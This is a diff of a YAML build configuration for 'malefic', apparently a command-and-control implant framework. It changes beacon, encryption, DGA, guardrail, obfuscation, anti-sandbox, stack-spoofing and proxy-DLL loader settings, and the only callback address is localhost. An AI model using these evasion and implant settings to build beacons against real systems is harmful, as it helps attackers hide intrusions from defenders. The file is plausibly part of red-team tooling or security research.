@@ -1,37 +1,45 @@
 basic:
   name: "malefic"
-  targets:
-    - "127.0.0.1:5001"
-  protocol: "tcp"
-  tls:
-    enable: true                    # 启用TLS
-    version: "auto"                 # TLS版本: "auto", "1.2", "1.3"
-    sni: "localhost"                # 服务器名称指示（SNI）
-    skip_verification: true
-  #    mtls:                           # mTLS客户端证书配置（可选）
-  #      enable: false                 # 启用mTLS
-  #      client_cert: "client.crt"     # 客户端证书文件路径
-  #      client_key: "client.key"      # 客户端私钥文件路径
-  #      server_ca: ""                 # 用于验证服务端的CA证书路径（可选）
   proxy:
-  interval: 5
+    use_env_proxy: false
+    url: ""
+  cron: "*/5 * * * * * *" # cron express
   jitter: 0.2
+  server_retry: 10
+  global_retry: 1000000
   encryption: aes
   key: maliceofinternal
-  rem:
-    link:
-  http:
-    method: "POST"
-    path: "/jquery.js"
-    host: "127.0.0.1"
-    version: "1.1"
-    headers:
-      User-Agent: "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
-      Content-Type: "application/octet-stream"
-      #any-header: any-value
+
+  secure:
+    enable: false
+    private_key: "" # implant private key
+    public_key: "" # server public key
+
+  # DGA配置
+  dga:
+    enable: false
+    key: "malefic_dga_2024" # key
+    interval_hours: 8 # generate once every 8 hours
+
+  # Guardrail
+  guardrail:
+    enable: false
+    require_all: true
+    ip_addresses: []
+    usernames: []
+    server_names: []
+    domains: []
+
+  targets:
+  # tcp
+  - address: "127.0.0.1:5001"
+    tcp: {}
+
 build:
   zigbuild: false
+  obfstr: true
   remap: false # Force refresh remap-path-prefix configuration even if it already exists
+  toolchain: "nightly-2023-09-18"
   ollvm:
     enable: false
     bcfobf: false # Bogus Control Flow Obfuscation
@@ -50,8 +58,8 @@ build:
     original_filename: "normal.exe"
     file_description: "normal"
     internal_name: ""
-    require_admin: false  # whether to require admin privilege
-    require_uac: false    # whether to require uac privilege
+    require_admin: false # whether to require admin privilege
+    require_uac: false # whether to require uac privilege
 
 pulse:
   flags:
@@ -71,22 +79,21 @@ pulse:
     headers:
       User-Agent: "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
 
-
 implants:
-  runtime: tokio          # async runtime: smol/tokio/async-std
-  mod: beacon             # malefic mod: beacon/bind
-  register_info: true     # whether collect sysinfo when register
-  hot_load: true          # enable hot load module
-  modules:                # module when malefic compile
-    - "full"
-  enable_3rd: false       # enable 3rd module
-  3rd_modules:            # 3rd module when malefic compile
-    #    - curl
-    #    - rem_static
-    - full
+  runtime: tokio # async runtime: smol/tokio/async-std
+  mod: beacon # malefic mod: beacon/bind
+  register_info: true # whether collect sysinfo when register
+  hot_load: true # enable hot load module
+  modules:
+  # module when malefic compile
+  - "full"
+  enable_3rd: false # enable 3rd module
+  3rd_modules:
+  # 3rd module when malefic compile
+  - full
 
-  autorun: ""             # autorun config filename
-  pack:                   # pack
+  prelude: "" # prelude config filename
+  pack: [] # pack
   #    - src: "1.docx"
   #      dst: "1.docs"
   flags:
@@ -96,9 +103,10 @@ implants:
     artifact_id: 0x1
 
   # for professional
-  anti: # 反沙箱反调试反编译反取证相关
+  anti:
+    # 反沙箱反调试反编译反取证相关
     sandbox: false
-    vm: false            # enable anti vm
+    vm: false # enable anti vm
     # debug: true         # enable anti debug
     # disasm: true        # enable anti disasm
     # emulator: true      # enable anti emulator
@@ -128,14 +136,13 @@ implants:
     # allocter_ex: "VirtualAllocEx", "NtAllocateVirtualMemory",
     #              "VirtualAllocExNuma", "NtMapViewOfSection"
     crossprocess: "NtAllocateVirtualMemory"
-  sleep_mask: true
-  stack_spool: true
-  sacrifice_process: true
-  fork_and_run: false
-  hook_exit: true
   thread_stack_spoofer: true
-  pe_signature_modify:
-    feature: true
-    modify:
-      magic: "\x00\x00"
-      signature: "\x00\x00"
+
+loader:
+  proxydll:
+    proxyfunc: ""
+    raw_dll: ""
+    proxied_dll: ""
+    proxy_dll: ""
+    block: true
+    pack_resources: false
